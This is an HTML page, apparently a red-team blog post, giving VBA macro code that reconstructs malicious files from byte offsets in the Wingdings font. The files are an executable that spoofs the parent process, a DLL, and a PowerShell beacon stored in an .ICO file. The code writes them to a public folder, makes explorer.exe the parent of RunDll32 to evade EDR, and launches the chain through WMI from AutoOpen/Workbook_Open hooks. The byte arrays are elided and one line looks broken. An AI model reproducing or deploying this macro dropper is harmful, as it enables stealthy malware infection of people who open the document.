<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>VBA To Generate Malicious Components</title>
</head><body>The following (crappy) VBA code will use the bytes array we created to generate malicious components. The next steps of the following code is to select Explorer.exe as a parent process for RunDll32.exe (to confuse EDR products ;-)), then will execute the malicious components with RunDll32.exe (a .DLL running a PowerShell beacon from an .ICO resource). You could replace this by injecting memory processes instead of writing files to the disk. <b>The exercise is left to the reader.</b><br/>
VBA code:<br/>
<br/>
<br/>
<br/>
[...] --&gt; you array of bytes containing the position of necessary bytes in the Windings font.<br/>
<br/>
'example to join the bytes for the fist malicious component<br/>
<br/>
&nbsp; &nbsp; t1 = cc1<br/>
&nbsp; &nbsp; t2 = cc2<br/>
&nbsp; &nbsp; t3 = cc3<br/>
&nbsp; &nbsp; t4 = cc4<br/>
&nbsp; &nbsp; t5 = cc5<br/>
&nbsp; &nbsp; t6 = cc6<br/>
&nbsp; &nbsp; t7 = cc7<br/>
&nbsp; &nbsp; t8 = cc8<br/>
&nbsp; &nbsp; t9 = cc9<br/>
&nbsp; &nbsp; t10 = cc10<br/>
&nbsp; &nbsp; t11 = cc11<br/>
&nbsp; &nbsp; t12 = cc12<br/>
&nbsp; &nbsp; t13 = cc13<br/>
&nbsp; &nbsp; t14 = cc14<br/>
&nbsp; &nbsp; t15 = cc15<br/>
&nbsp; &nbsp; t16 = cc16<br/>
&nbsp; &nbsp; t17 = cc17<br/>
&nbsp; &nbsp; t18 = cc18<br/>
<br/>
&nbsp; &nbsp; ttt = Split(Join(t1, ",") &amp; "," &amp; Join(t2, ",") &amp; "," &amp; Join(t3, ",") &amp; "," &amp; Join(t4, ",") &amp; "," &amp; Join(t5, ",") &amp; "," &amp; Join(t6, ",") &amp; "," &amp; Join(t7, ",") &amp; "," &amp; Join(t8, ",") &amp; "," &amp; Join(t9, ",") _<br/>
&nbsp; &nbsp; &nbsp;&amp; "," &amp; Join(t10, ",") &amp; "," &amp; Join(t11, ",") &amp; "," &amp; Join(t12, ",") &amp; "," &amp; Join(t13, ",") &amp; "," &amp; Join(t14, ",") &amp; "," &amp; Join(t15, ",") &amp; "," &amp; Join(t16, ",") &amp; "," &amp; Join(t17, ",") &amp; "," &amp; Join(t18, ","), ",")<br/>
<br/>
<br/>
[...]<br/>
<br/>
<br/>
&nbsp; &nbsp; Dim nb As Integer<br/>
&nbsp; &nbsp; Dim nb2 As Integer<br/>
&nbsp; &nbsp; nb = UBound(ttt) - LBound(ttt) + 1 'ttt is a joined byte array<br/>
&nbsp; &nbsp; nb2 = UBound(tt) - LBound(tt) + 1<br/>
&nbsp; &nbsp; nb3 = UBound(ttttttt) - LBound(ttttttt) + 1<br/>
&nbsp; &nbsp; Dim intFileNumber As Integer<br/>
&nbsp; &nbsp; Dim i As Integer<br/>
&nbsp; &nbsp; Dim j As Integer<br/>
&nbsp; &nbsp; Dim lngFileSize As Long<br/>
&nbsp; &nbsp; Dim lngFileSize2 As Long<br/>
&nbsp; &nbsp; Dim strBuffer As String<br/>
&nbsp; &nbsp; Dim strBuffer2 As String<br/>
&nbsp; &nbsp; Dim lngCharNumber As Long<br/>
&nbsp; &nbsp; Dim lngCharNumber2 As Long<br/>
&nbsp; &nbsp; Dim strCharacter As String * 1<br/>
&nbsp; &nbsp; Dim strCharacter2 As String * 1<br/>
&nbsp; &nbsp; Dim strFileName As String<br/>
&nbsp; &nbsp; Dim strFileName2 As String<br/>
&nbsp; &nbsp; Dim offset() As Variant<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; strFileName = "C:\Windows\Fonts\wingding.ttf"<br/>
&nbsp; &nbsp; intFileNumber = FreeFile<br/>
&nbsp; &nbsp; Open strFileName For Binary Access Read Shared As #intFileNumber<br/>
&nbsp; &nbsp; &nbsp; &nbsp; lngFileSize = LOF(intFileNumber)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strBuffer = Space$(lngFileSize)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Get #intFileNumber, , strBuffer<br/>
&nbsp; &nbsp; Close #intFileNumber<br/>
<br/>
&nbsp; &nbsp;Dim nFileNum As Long<br/>
&nbsp; &nbsp;Dim sFilename As String<br/>
&nbsp; &nbsp;Dim ind As Long<br/>
&nbsp; &nbsp;sFilename2 = "C:\Users\Public\Documents\changeMyParent.exe" ' crafted binary that will be use to select the parent of rundll32<br/>
&nbsp; &nbsp;sFilename = "C:\Users\Public\Documents\runPoshCode.dll" ' .DLL that will run powershell beacon from an image<br/>
&nbsp; &nbsp;sFilename3 = "C:\Users\Public\Documents\BEACON.ico" ' malicious powershell beacon registered in an .ICO<br/>
&nbsp; &nbsp;nFileNum = FreeFile<br/>
&nbsp; &nbsp;' a loop would be better ;-)<br/>
&nbsp; &nbsp;Open sFilename2 For Binary Lock Read Write As #nFileNum<br/>
&nbsp; &nbsp; &nbsp; &nbsp;For lngCharNumber = 0 To nb - 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ind = lngCharNumber + 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; off = ttt(lngCharNumber)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strCharacter = Mid(strBuffer, off, 1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Put #nFileNum, ind, strCharacter<br/>
&nbsp; &nbsp; &nbsp; &nbsp;Next lngCharNumber<br/>
&nbsp; &nbsp;Close #nFileNum<br/>
&nbsp; &nbsp;<br/>
&nbsp; &nbsp;nFileNum = FreeFile<br/>
&nbsp; &nbsp;Open sFilename For Binary Lock Read Write As #nFileNum<br/>
&nbsp; &nbsp; &nbsp; &nbsp;For lngCharNumber = 0 To nb2 - 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ind = lngCharNumber + 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; off = tt(lngCharNumber)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strCharacter = Mid(strBuffer, off, 1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Put #nFileNum, ind, strCharacter<br/>
&nbsp; &nbsp; &nbsp; &nbsp;Next lngCharNumber<br/>
&nbsp; &nbsp;Close #nFileNum<br/>
&nbsp; &nbsp;<br/>
&nbsp; &nbsp;nFileNum = FreeFile<br/>
&nbsp; &nbsp;Open sFilename3 For Binary Lock Read Write As #nFileNum<br/>
&nbsp; &nbsp; &nbsp; &nbsp;For lngCharNumber = 0 To nb3 - 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ind = lngCharNumber + 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; off = ttttttt(lngCharNumber)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strCharacter = Mid(strBuffer, off, 1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Put #nFileNum, ind, strCharacter<br/>
&nbsp; &nbsp; &nbsp; &nbsp;Next lngCharNumber<br/>
&nbsp; &nbsp;Close #nFileNum<br/>
&nbsp; &nbsp;rr<br/>
End Sub<br/>
<br/>
Sub rr()<br/>
&nbsp; Dim xx As String<br/>
&nbsp; Dim oihfasf As Object, eopuf As Object, kdj As Object<br/>
&nbsp; Dim oDic As Object, a() As Variant<br/>
&nbsp; Dim pskaf As Integer<br/>
&nbsp;<br/>
&nbsp; Set oDic = CreateObject("Scripting.Dictionary")<br/>
<br/>
&nbsp; xx = "."<br/>
<br/>
&nbsp; Set oihfasf = GetObject("winmgmts:\\" _<br/>
&nbsp; &nbsp; &nbsp; &amp; xx &amp; "\root\CIMV2")<br/>
&nbsp; Set eopuf = oihfasf.ExecQuery _<br/>
&nbsp; &nbsp; &nbsp; ("Select Name, ProcessID FROM Win32_Process", , 48)<br/>
<br/>
&nbsp; For Each kdj In eopuf<br/>
&nbsp; &nbsp; &nbsp; If (kdj.Properties_("Name").Value) = "explorer.exe" Then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pskaf = (kdj.Properties_("ProcessID").Value)<br/>
&nbsp; &nbsp; &nbsp; End If<br/>
&nbsp; Next<br/>
Dim t As Date<br/>
<br/>
Dim cnt As Long<br/>
Dim arr(2) As Byte<br/>
<br/>
Dim xl As String<br/>
xl = "C:\Users\Public\Documents\changeMyParent.exe ""C:\Windows\system32\RunDll32.exe C:\Users\Public\Documents\runPoshCode.dll,ComputeFmMediaType -f C:\Users\Public\Documents\BEACON.ico"" " &amp; pskafxx = "."<br/>
Set ow = GetObject("winmgmts:\\" &amp; xx &amp; "\Root\cimv2")<br/>
Set os = ow.Get("Win32_ProcessStartup")<br/>
Set oc = os.SpawnInstance_<br/>
Set op = GetObject("winmgmts:\\" &amp; xx &amp; "\root\cimv2:Win32_Process")<br/>
op.Create xl, Null, oc, aslh<br/>
<br/>
End Sub<br/>
Sub AutoOpen()<br/>
&nbsp; &nbsp; cc<br/>
End Sub<br/>
Sub Workbook_Open()<br/>
&nbsp; &nbsp; cc<br/>
End Sub<br/>
</body></html>